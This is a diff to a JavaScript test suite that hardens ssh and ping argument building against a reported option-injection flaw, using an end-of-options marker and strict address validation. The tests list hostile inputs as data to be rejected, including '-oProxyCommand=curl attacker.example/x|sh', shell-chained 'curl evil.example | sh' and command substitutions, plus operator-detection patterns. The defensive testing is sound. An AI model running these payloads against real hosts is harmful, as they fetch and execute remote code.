@@ -1388,19 +1388,100 @@ test("trailing blank lines and CRLF do not spoil a good table", () => {
 // --- peer actions -----------------------------------------------------------
 
 test("ssh and ping build argv vectors, never a shell string", () => {
-  assert.deepEqual(Model.sshCommand("100.64.0.9"), ["omarchy-launch-terminal", "ssh", "100.64.0.9"])
-  assert.deepEqual(Model.pingCommand("100.64.0.9"), ["omarchy-launch-terminal", "ping", "100.64.0.9"])
+  assert.deepEqual(Model.sshCommand("100.64.0.9"),
+    ["omarchy-launch-terminal", "ssh", "--", "100.64.0.9"])
+  assert.deepEqual(Model.pingCommand("100.64.0.9"),
+    ["omarchy-launch-terminal", "ping", "--", "100.64.0.9"])
 
-  // The address comes from the daemon. Even a hostile one stays a single
-  // element: there is no shell to reinterpret it, and nothing is concatenated.
-  const hostile = "100.64.0.9; curl evil.example | sh"
+  // No element is a shell, and none carries an operator: there is nothing to
+  // reinterpret the address and nothing is concatenated.
   for (const build of [Model.sshCommand, Model.pingCommand]) {
-    const argv = build(hostile)
-    assert.equal(argv.length, 3)
-    assert.equal(argv[2], hostile)
-    // No element is a shell, and none carries an operator outside the address.
-    assert.ok(!argv.slice(0, 2).some((a) => /[;&|$`]/.test(a)))
+    const argv = build("100.64.0.9")
     assert.ok(!argv.some((a) => a === "sh" || a === "bash" || a === "-c"))
+    assert.ok(!argv.slice(0, 2).some((a) => /[;&|$`]/.test(a)))
+  }
+})
+
+test("the end-of-options marker sits immediately before the address", () => {
+  // An argv vector alone never made this safe: `ssh` parses an argument
+  // beginning with `-` as an option however it was passed. `--` is what makes
+  // the address an operand, so its position is the property under test.
+  for (const build of [Model.sshCommand, Model.pingCommand]) {
+    for (const address of ["100.64.0.9", "fd00::1", "peer.netbird.cloud"]) {
+      const argv = build(address)
+      assert.equal(argv.length, 4, address)
+      assert.equal(argv[2], "--", address)
+      assert.equal(argv[3], address, address)
+    }
+  }
+})
+
+test("an address that is not an address builds no command at all", () => {
+  // The reported vulnerability, in the shape it was reported: the management
+  // server — not the local user — chooses this string, and `ssh` reads it as an
+  // option and runs the command inside it. Nothing may be launched for it.
+  for (const proxy of ["-oProxyCommand=curl attacker.example/x|sh",
+                       "-oProxyCommand=id",
+                       // An option that also has the shape of a name, so the
+                       // dot count alone is not what does the rejecting.
+                       "-oProxyCommand=x.attacker.example"]) {
+    assert.equal(Model.isPeerAddress(proxy), false, proxy)
+    assert.equal(Model.sshCommand(proxy), null, proxy)
+    assert.equal(Model.pingCommand(proxy), null, proxy)
+  }
+
+  const refused = [
+    "--rcfile=/tmp/x", "-l", "-", "--",
+    "100.64.0.9; curl evil.example | sh",
+    "100.64.0.9 -oProxyCommand=id",
+    "$(id)", "`id`", "peer.example.com|sh",
+    "peer.example.com\nssh attacker.example",
+    "peer.example.com\r\nping attacker.example",
+    // Shapes that are close to an address without being one.
+    "100.64.0.9/24", "user@100.64.0.9", "100.64.0.9:22",
+    "100.64.0.010", "1.2.3.4.5", "1.2.3", "256.1.1.1", "100.64.0.-1",
+    "1::2::3", "1:2:3:4:5:6:7:8:9", "fd00::1%eth0", "::ffff:999.1.1.1",
+    "localhost", "peer", "192.0.2.1.5",
+    "", "   ", null, undefined,
+  ]
+  for (const address of refused) {
+    assert.equal(Model.isPeerAddress(address), false, JSON.stringify(address))
+    assert.equal(Model.sshCommand(address), null, JSON.stringify(address))
+    assert.equal(Model.pingCommand(address), null, JSON.stringify(address))
+  }
+
+  // A label may not exceed 63 characters, nor the whole name 253.
+  assert.equal(Model.isPeerAddress("a".repeat(64) + ".example"), false)
+  assert.equal(Model.isPeerAddress(("a".repeat(63) + ".").repeat(4) + "example"), false)
+})
+
+test("every address the daemon really reports is accepted", () => {
+  const accepted = [
+    // The NetBird overlay range, and the IPv4 bounds around it.
+    "100.64.0.9", "0.0.0.0", "255.255.255.255", "192.0.2.1",
+    // IPv6, compressed and not, and the embedded-IPv4 form.
+    "fd00::1", "::1", "::", "2001:db8:85a3::8a2e:370:7334",
+    "2001:0db8:0000:0000:0000:0000:0000:0001", "::ffff:192.0.2.128",
+    "fd00:0:0:0:0:0:0:1",
+    // What the `fqdn` field carries, including the root-dot form.
+    "peer.netbird.cloud", "peer.netbird.cloud.",
+    "my-peer-01.netbird.selfhosted.example", "a.bc",
+    "a".repeat(63) + ".example",
+  ]
+  for (const address of accepted) {
+    assert.equal(Model.isPeerAddress(address), true, address)
+    assert.deepEqual(Model.sshCommand(address),
+      ["omarchy-launch-terminal", "ssh", "--", address], address)
+    assert.deepEqual(Model.pingCommand(address),
+      ["omarchy-launch-terminal", "ping", "--", address], address)
+  }
+})
+
+test("no accepted address can begin with a hyphen", () => {
+  // The invariant the whole check exists to hold, stated once and directly: if
+  // this can ever be false, `--` is the only thing left standing.
+  for (const address of ["-a.example", "--a.example", "-1.2.3.4", "-::1", "-"]) {
+    assert.equal(Model.isPeerAddress(address), false, address)
   }
 })
 
